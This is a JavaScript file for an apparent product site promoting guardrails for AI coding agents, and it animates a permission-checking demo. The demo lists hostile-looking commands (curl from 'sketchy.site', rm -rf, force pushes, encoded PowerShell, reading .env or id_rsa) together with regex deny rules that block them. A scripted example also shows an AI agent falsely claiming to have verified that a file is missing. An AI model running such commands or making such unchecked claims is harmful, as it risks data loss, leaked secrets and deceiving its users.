/* APOLLO shared behaviour: nav state, reveals, counters, terminals, phone, confetti. Every block guards for missing elements. */
(function(){
  const reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;

  /* nav active state */
  const here=(location.pathname.split('/').pop()||'index.html').toLowerCase();
  document.querySelectorAll('.links a').forEach(a=>{const h=(a.getAttribute('href')||'').toLowerCase();if(h===here||(here==='index.html'&&h==='index.html'))a.classList.add('on');});

  /* reveals: transform-only, visible at rest */
  const rv=document.querySelectorAll('.rv');
  if('IntersectionObserver' in window&&!reduce){const io=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}}),{threshold:.12});rv.forEach(el=>io.observe(el));}
  else rv.forEach(el=>el.classList.add('in'));

  /* counters */
  document.querySelectorAll('[data-count]').forEach(el=>{const to=parseFloat(el.dataset.count),dec=(el.dataset.dec||0)|0,suf=el.dataset.suf||'',pre=el.dataset.pre||'';const fin=()=>el.textContent=pre+to.toFixed(dec)+suf;if(reduce){fin();return;}const t0=performance.now(),d=1400;const f=t=>{const p=Math.min(1,(t-t0)/d),e=1-Math.pow(1-p,3);el.textContent=pre+(to*e).toFixed(dec)+suf;if(p<1)requestAnimationFrame(f);else fin();};requestAnimationFrame(f);});

  /* bars */
  document.querySelectorAll('.bar i[data-w]').forEach(i=>setTimeout(()=>i.style.width=i.dataset.w+'%',200));

  /* two nights */
  const BAD=[['m','> fix the LoRa receive timeout'],['m','building…'],['e','error: LoRaRxBuffer was not declared'],['m','adding include… building…'],['e','error: LoRaRxBuffer was not declared'],['m','building…'],['e','error: LoRaRxBuffer was not declared'],['m','building…'],['e','error: LoRaRxBuffer was not declared'],['x','(23 minutes of this)'],['m','trying browser tool to search docs…'],['x','(nothing happens — tool is disabled, nobody told it)'],['m','trying browser tool again…'],['x','(nothing)'],['m','"The issue is that radio.h is missing from the repo."'],['w','GeneralDussDuss: "it\'s right there. include/radio.h."'],['m','"I\'ve verified it: the file does not exist. You may be looking at a different branch."'],['x','(it is on the same branch. it never looked.)'],['w','the Dussmeister: "what are you doing"'],['m','"Let me try a different approach." building…'],['e','error: LoRaRxBuffer was not declared'],['h','He kills it. Opens the file himself. Fixes it in 4 minutes. It\'s 1:07am.']];
  const GOOD=[['m','> fix the LoRa receive timeout'],['x','apollo: new branch apollo/lora-rx-fix · sandbox C:\\dev\\sonnet'],['m','building…'],['e','error: LoRaRxBuffer was not declared'],['m','adding include… building…'],['e','error: LoRaRxBuffer was not declared'],['w','apollo: same mistake twice → BLOCKED. "Change approach."'],['m','"I believe radio.h is missing." → apollo: show me. → <ls include/> → radio.h is there. claim dropped.'],['m','reading the header instead…'],['w','apollo: still stuck → writing itself a 200-word note → fresh start'],['x','note: "tried include (no), tried header (no). hypothesis: wrong build filter"'],['m','session 2 · editing platformio.ini'],['g','build: SUCCESS'],['g','tests: 12 passed · checkpoint saved'],['w','apollo: wants to flash the chip → touches hardware → asking the phone'],['x','Dussy taps Deny: "tomorrow at the desk"'],['h','Done. Logged. He was asleep the whole time. 11 steps, $0.84.']];
  const tB=document.getElementById('tBad'),tG=document.getElementById('tGood');let timers=[];
  function run(el,script,ms,fid,ft){let i=0;const step=()=>{if(i>=script.length){const f=document.getElementById(fid);if(f)f.textContent=ft;return;}const [c,t]=script[i++];const s=document.createElement('span');s.className=c;s.textContent=t+'\n';el.appendChild(s);el.scrollTop=el.scrollHeight;timers.push(setTimeout(step,reduce?0:ms));};step();}
  function reset(){timers.forEach(clearTimeout);timers=[];if(tB)tB.innerHTML='<span class="x">// waiting…</span>';if(tG)tG.innerHTML='<span class="x">// waiting…</span>';['fBad','fGood'].forEach(id=>{const f=document.getElementById(id);if(f)f.textContent='';});}
  if(tB&&tG){const p=document.getElementById('play'),r=document.getElementById('replay');if(p)p.addEventListener('click',()=>{reset();tB.innerHTML='';tG.innerHTML='';run(tB,BAD,520,'fBad','0 fixed · 1 human · 1:07am');run(tG,GOOD,560,'fGood','1 fixed · 0 humans · 11:52pm');});if(r)r.addEventListener('click',reset);}

  /* phone */
  const pres=document.getElementById('pres'),ttl=document.getElementById('ttl'),pOk=document.getElementById('pOk'),pNo=document.getElementById('pNo');
  if(pres&&ttl&&pOk&&pNo){let secs=598;const tt=setInterval(()=>{secs--;ttl.textContent=String(Math.floor(secs/60)).padStart(2,'0')+':'+String(secs%60).padStart(2,'0');if(secs<=0){clearInterval(tt);pres.textContent='no answer → denied · code expired';}},1000);
    const decide=ok=>{clearInterval(tt);pres.textContent=ok?'allowed · one-time code burned · flashing COM7 now':'denied · "not now" · Apollo re-plans around it';pOk.disabled=pNo.disabled=true;};
    pOk.addEventListener('click',()=>decide(true));pNo.addEventListener('click',()=>decide(false));}

  /* confetti + hype counter */
  const cv=document.getElementById('fx'),hype=document.getElementById('hype'),count=document.getElementById('count');
  if(cv&&hype&&count){const cx=cv.getContext('2d');let parts=[],raf=null;const LINES=['LET\'S GO','CATTLE SECURED','NO MORE BABYSITTING','APOLLO ONLINE','HERMES IN SHAMBLES','THE WALL DECIDES','SUN\'S OUT, GATE\'S UP'];
    const COLORS=['#d4a84b','#f3d27a','#2ecc8f','#7ff0c2','#f4ecda'];
    function burst(){const r=cv.getBoundingClientRect();cv.width=r.width;cv.height=r.height;for(let i=0;i<160;i++)parts.push({x:r.width/2,y:r.height*.55,vx:(Math.random()-.5)*16,vy:-Math.random()*15-3,g:.35,s:Math.random()*5+3,c:COLORS[(Math.random()*COLORS.length)|0],a:1,r:Math.random()*6.28,vr:(Math.random()-.5)*.3});if(!raf)tick();}
    function tick(){cx.clearRect(0,0,cv.width,cv.height);parts=parts.filter(p=>p.a>0&&p.y<cv.height+20);for(const p of parts){p.vy+=p.g;p.x+=p.vx;p.y+=p.vy;p.vx*=.99;p.a-=.008;p.r+=p.vr;cx.save();cx.globalAlpha=Math.max(0,p.a);cx.translate(p.x,p.y);cx.rotate(p.r);cx.fillStyle=p.c;cx.fillRect(-p.s/2,-p.s/2,p.s,p.s*1.6);cx.restore();}raf=parts.length?requestAnimationFrame(tick):null;}
    let n=0;try{n=parseInt(localStorage.getItem('apollo-hype')||'0',10)||0;}catch(e){}
    const show=()=>{count.textContent=LINES[n%LINES.length]+(n>1?'  ×'+n:'');};
    hype.addEventListener('click',()=>{n++;try{localStorage.setItem('apollo-hype',String(n));}catch(e){}if(!reduce)burst();show();});
    if(n>0)show();}
})();

/* ===== slick bits ===== */
(function(){
  const reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;

  /* tilt cards */
  if(!reduce&&matchMedia('(hover:hover)').matches){document.querySelectorAll('.tilt').forEach(c=>{c.addEventListener('pointermove',e=>{const r=c.getBoundingClientRect(),x=(e.clientX-r.left)/r.width,y=(e.clientY-r.top)/r.height;c.style.transform=`perspective(900px) rotateX(${(0.5-y)*8}deg) rotateY(${(x-0.5)*10}deg) translateY(-4px)`;c.style.setProperty('--mx',(x*100)+'%');c.style.setProperty('--my',(y*100)+'%');});c.addEventListener('pointerleave',()=>{c.style.transform='';});});}

  /* the wall */
  const throwEl=document.getElementById('throw'),cmd=document.getElementById('cmd'),stamp=document.getElementById('stamp');
  if(throwEl&&cmd&&stamp){
    const MOVES=['git status','pio run -e esp32dev','git push origin main','pio run -t upload (flash the chip)','rm -rf C:\\dev\\sonnet\\build','git push --force','curl https://sketchy.site/script.sh','read my .env file','edit its own rules file','powershell -EncodedCommand ZQBj…','npm install left-pad','say "the file is missing" without checking','make me a sandwich'];
    const seq=0;let n=0;
    function judge(s){const t=s.toLowerCase();
      if(/rules|\.claude|programdata\\apollo|tailscale|schtasks|env:|its own/.test(t))return['deny','SELF','Touches Apollo\'s own rules, keys or settings.','Not even you can approve this one. Hard no, by design.'];
      if(/encodedcommand|bash -c|cmd \/c|\| ?iex/.test(t))return['deny','SNEAKY','Hiding the real command inside another command.','The wall blocks what it can\'t read.'];
      if(/--force|rm -rf|remove-item.*-recurse|del \/s|format |diskpart|reg add/.test(t))return['deny','IRREVERSIBLE','Can\'t be undone, and nobody asked.','This is the "deleted the production database" move. Blocked every time.'];
      if(/curl|wget|invoke-webrequest/.test(t))return['deny','EGRESS','Downloading from the open internet.','The one way secrets leak. Closed by default.'];
      if(/say |claim|without checking|trust me|it's fixed|is missing/.test(t))return['ask','UNPROVEN','A claim with no receipt.','Show the command and its output, or it doesn\'t count. Nothing is "done" until the build is green.'];
      if(/\.env|password|secret|id_rsa|\.ssh/.test(t))return['deny','SECRETS','Reading a file that holds keys.','The keys aren\'t taped to the door anymore.'];
      if(/upload|flash|git push|npm install|pip install|uv add|git checkout|adb/.test(t))return['ask','SIDE EFFECT','Touches hardware, the internet, or your branches.','Your phone buzzes with this exact command. Tap Allow or Deny.'];
      if(/^(git status|git diff|git log|ls|dir|cat|type|read)/.test(t))return['allow','READ-ONLY','Looks, doesn\'t touch.','Logged and let through.'];
      if(/^(pio run|pio test|npm test|npm run|pytest|uv run|gradlew|edit)/.test(t))return['allow','REVERSIBLE','Builds, tests, edits inside the sandbox.','Apollo saves a checkpoint first, so undo is one command.'];
      return['ask','UNKNOWN','Never seen this before.','When the wall isn\'t sure, it asks. It never guesses "yes".'];}
    function show(s){const [act,cls,why,sub]=judge(s);n++;stamp.className='stamp';void stamp.offsetWidth;stamp.textContent={allow:'ALLOWED',ask:'ASK THE HUMAN',deny:'BLOCKED'}[act];stamp.classList.add(act,'show');
      document.getElementById('vcmd').textContent=s;document.getElementById('vwhy').textContent=cls+' · '+why;document.getElementById('vsub').textContent=sub;
      document.getElementById('vtele').textContent=`logbook #${String(400+n).padStart(4,'0')} · ${act} · chained to #${String(399+n).padStart(4,'0')} · hash ${Math.random().toString(16).slice(2,8)}…`;}
    MOVES.forEach(m=>{const b=document.createElement('button');b.type='button';b.textContent=m;b.addEventListener('click',()=>{b.classList.remove('thrown');void b.offsetWidth;b.classList.add('thrown');show(m);});throwEl.appendChild(b);});
    document.getElementById('go').addEventListener('click',()=>{if(cmd.value.trim())show(cmd.value.trim());});
    cmd.addEventListener('keydown',e=>{if(e.key==='Enter'&&cmd.value.trim())show(cmd.value.trim());});
  }

  /* kill switch */
  const kb=document.getElementById('kbtn'),kl=document.getElementById('klog');
  if(kb&&kl){let busy=false;kb.addEventListener('click',()=>{if(busy)return;busy=true;kb.classList.add('go');kl.innerHTML='';const L=[[0,'w','0.000s  button pressed · flag set · every new action now blocked'],[120,'',"0.120s  telling the AI to stop mid-sentence"],[700,'',"0.700s  it didn't stop fast enough → force-killing the whole process tree"],[1100,'g','1.098s  dead. all of it.'],[1300,'',"1.300s  your files? untouched. the work was on its own branch."],[1500,'g','1.500s  logbook entry written. chain intact.'],[1900,'big','STOPPED · 1.5 s']];
      L.forEach(([t,c,s])=>setTimeout(()=>{const el=document.createElement('div');if(c)el.className=c;el.textContent=s;kl.appendChild(el);if(t===1900){setTimeout(()=>{kb.classList.remove('go');busy=false;},1200);}},reduce?0:t));});}

  /* router */
  const wires=document.getElementById('wires'),rolesEl=document.getElementById('roles'),engEl=document.getElementById('engines'),costN=document.getElementById('costN'),notes=document.getElementById('costNotes');
  if(wires&&rolesEl&&engEl){
    const MODES={p1:{cost:0.84,map:{explorer:'claude',planner:'claude',implementer:'claude',reviewer:'claude',voice:'claude'},notes:['One brain does everything. Simple, and the best brain for building.','The reviewer is the same model as the builder, so it shares the builder\'s blind spots.']},
      p6:{cost:0.41,map:{explorer:'local',planner:'claude',implementer:'claude',reviewer:'gpt',voice:'local'},notes:['Looking around and talking back go to a free model on the GPU. Nothing leaves the machine.','The reviewer is a different brand on purpose: it doesn\'t think like the builder, so it catches more.','The builder stays on the best model. The walls are identical for all three.']}};
    function draw(mode){const M=MODES[mode];document.querySelectorAll('.seg button').forEach(b=>b.classList.toggle('on',b.dataset.mode===mode));
      const used=new Set(Object.values(M.map));engEl.querySelectorAll('.node').forEach(n=>{const on=used.has(n.dataset.e);n.classList.toggle('lit',on);n.classList.toggle('em',n.dataset.e==='local');n.classList.toggle('dim',!on);});
      rolesEl.querySelectorAll('.node').forEach(n=>{n.classList.add('lit');n.classList.toggle('em',M.map[n.dataset.r]==='local');});
      const box=wires.getBoundingClientRect();wires.innerHTML='';wires.setAttribute('viewBox',`0 0 ${box.width} ${box.height}`);
      Object.entries(M.map).forEach(([r,e])=>{const a=rolesEl.querySelector(`[data-r="${r}"]`).getBoundingClientRect(),b=engEl.querySelector(`[data-e="${e}"]`).getBoundingClientRect();const x1=a.right-box.left,y1=a.top+a.height/2-box.top,x2=b.left-box.left,y2=b.top+b.height/2-box.top,mx=(x1+x2)/2;const p=document.createElementNS('http://www.w3.org/2000/svg','path');p.setAttribute('d',`M${x1},${y1} C${mx},${y1} ${mx},${y2} ${x2},${y2}`);if(e==='local')p.setAttribute('class','em');wires.appendChild(p);});
      if(costN){const from=parseFloat(costN.textContent.replace(/[^0-9.]/g,''))||0,to=M.cost,t0=performance.now();const f=t=>{const p=Math.min(1,(t-t0)/700),v=from+(to-from)*(1-Math.pow(1-p,3));costN.innerHTML=`$${v.toFixed(2)}<small>/ task</small>`;if(p<1)requestAnimationFrame(f);};reduce?costN.innerHTML=`$${to.toFixed(2)}<small>/ task</small>`:requestAnimationFrame(f);}
      if(notes)notes.innerHTML=M.notes.map(x=>`<li>${x}</li>`).join('');}
    let cur='p1';document.querySelectorAll('.seg button').forEach(b=>b.addEventListener('click',()=>{cur=b.dataset.mode;draw(cur);}));
    draw(cur);addEventListener('resize',()=>draw(cur));
  }

  /* copy rss */
  const cp=document.getElementById('copyrss'),ru=document.getElementById('rssurl');
  if(cp&&ru){cp.addEventListener('click',()=>{const done=()=>{cp.textContent='Copied';setTimeout(()=>cp.textContent='Copy',1500);};if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(ru.value).then(done).catch(()=>{ru.select();done();});}else{ru.select();done();}});}
})();
